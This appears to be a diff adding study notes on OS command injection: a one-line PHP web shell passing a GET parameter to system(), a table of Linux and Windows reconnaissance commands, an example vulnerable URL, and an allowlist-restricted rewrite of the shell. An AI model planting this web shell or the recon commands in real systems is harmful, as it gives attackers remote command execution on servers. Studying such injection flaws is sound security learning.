@@ -1,0 +1,29 @@
+<?php echo system($_GET['command']); ?>
+
+
+Purpose of command 	Linux 	Windows
+Name of current user 	whoami 	whoami
+Operating system 	uname -a 	ver
+Network configuration 	ifconfig 	ipconfig /all
+Network connections 	netstat -an 	netstat -an
+Running processes 	ps -ef 	tasklist 
+
+https://insecure-website.com/stockStatus?productID=381&storeID=29
+
+// Ensure the 'command' parameter is sanitized and restrict to specific commands
+$allowedCommands = [
+    'whoami',
+    'uname -a',
+    'ifconfig',
+    'netstat -an',
+    'ps -ef',
+    'ver',
+    'ipconfig /all',
+    'tasklist'
+];
+
+if (isset($_GET['command']) && in_array($_GET['command'], $allowedCommands)) {
+    echo system($_GET['command']);
+} else {
+    echo "Invalid command.";
+}
